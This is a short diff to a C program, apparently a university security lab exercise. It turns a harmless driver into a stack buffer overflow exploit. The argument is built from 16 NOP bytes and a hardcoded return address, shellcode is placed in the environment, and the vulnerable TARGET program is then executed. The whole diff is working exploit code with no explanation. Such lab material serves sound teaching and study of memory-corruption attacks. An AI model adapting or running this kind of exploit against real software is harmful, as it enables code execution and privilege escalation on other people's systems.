@@ -11,13 +11,22 @@ int main(void)
 {
   char *args[3]; 
   char *env[1];
-  
+
+  char str[20];
+  memset(str, 0, 20);
+
+  for (int i = 0; i < 16; i++)
+  {
+  	strcat(str, "\x90");
+  }
+  strcat(str, "\xa0\x3d\xe4\xb7");
+
   args[0] = TARGET;
   // max input size is 4 * 5 = 20
-  args[1] = "student"; 
+  args[1] = str;
   args[2] = NULL;
   
-  env[0] = NULL;
+  env[0] = shellcode;
   execve(TARGET, args, env);
   fprintf(stderr, "execve failed.\n");
 
